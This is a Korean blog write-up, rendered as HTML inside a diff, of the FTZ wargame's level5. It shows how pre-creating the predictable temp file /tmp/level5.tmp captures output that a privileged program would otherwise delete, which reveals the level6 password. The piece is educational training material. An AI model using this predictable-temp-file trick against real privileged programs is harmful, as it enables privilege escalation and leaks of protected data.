@@ -1,0 +1,55 @@
+I"><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>login as: level5 
+level5@~~~~<span class="s1">'s password: 
+[level5@ftz level5]$ ls 
+hint  public_html  tmp 
+[level5@ftz level5]$ cat hint 
+
+/usr/bin/level5 프로그램은 /tmp 디렉토리에 
+level5.tmp 라는 이름의 임시파일을 생성한다. 
+
+이를 이용하여 level6의 권한을 얻어라.
+</span></code></pre></div></div>
+
+<p>level5/what is your name?으로 접속해, 바로 hint를 읽었다. 우선 level5 프로그램을 한번 실행시켜보자.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>level5@ftz tmp]<span class="nv">$ </span><span class="nb">cd</span> /usr/bin
+<span class="o">[</span>level5@ftz bin]<span class="nv">$ </span>./level5 
+<span class="o">[</span>level5@ftz bin]<span class="err">$</span>
+</code></pre></div></div>
+
+<p>그러나 아무일도 일어나지 않았다.</p>
+
+<p>level5 프로그램은 /tmp에 level5.tmp파일을 실행시킨다고 했으니, /tmp폴더를 확인해보자.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>level5@ftz tmp]<span class="nv">$ </span><span class="nb">ls 
+</span>mysql.sock 
+<span class="o">[</span>level5@ftz tmp]<span class="err">$</span>
+</code></pre></div></div>
+
+<p>그러나 아무 파일도 생기지 않는다. 그렇다면 한번 생각해보자. level5.tmp라는 임시파일을 생성하고, 프로그램이 종료되기 전 자동적으로 삭제해 버리는 프로그램은 아닐까? 그렇다면 그 내용이 사라지기 전, 어떻게 가로챌 수 있을까?</p>
+
+<p>혹시, 같은 이름의 파일을 만들어두면 거기에 내용이 덮어씌워지지 않을까?</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>level5@ftz tmp]<span class="nv">$ </span><span class="nb">cat</span> <span class="o">&gt;</span> level5.tmp 
+
+<span class="o">[</span>level5@ftz tmp]<span class="nv">$ </span><span class="nb">ls 
+</span>level5.tmp mysql.sock 
+<span class="o">[</span>level5@ftz tmp]<span class="err">$</span>
+</code></pre></div></div>
+
+<p>cat &gt; (만들 파일이름) 명령어로 우리가 임시로 level5.tmp라는 이름의 파일을 만들어두자. 그리고, level5 프로그램을 실행시켜보자.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>level5@ftz tmp]<span class="nv">$ </span><span class="nb">cd</span> /usr/bin 
+<span class="o">[</span>level5@ftz bin]<span class="nv">$ </span>./level5 
+<span class="o">[</span>level5@ftz bin]<span class="nv">$ </span><span class="nb">cd</span> /tmp 
+<span class="o">[</span>level5@ftz tmp]<span class="nv">$ </span><span class="nb">ls 
+</span>level5.tmp mysql.sock 
+<span class="o">[</span>level5@ftz tmp]<span class="nv">$ </span><span class="nb">cat </span>level5.tmp 
+next password : what the hell 
+<span class="o">[</span>level5@ftz tmp]<span class="err">$</span>
+</code></pre></div></div>
+
+<p>추측이 맞았다. 우리가 만들어 둔 level5.tmp파일에 값을 복사해 둔 채로 프로그램이 종료된 덕에 level6의 비밀번호를 알아냈다,</p>
+
+<p>level6’s password:”what the hell”</p>
+:ET
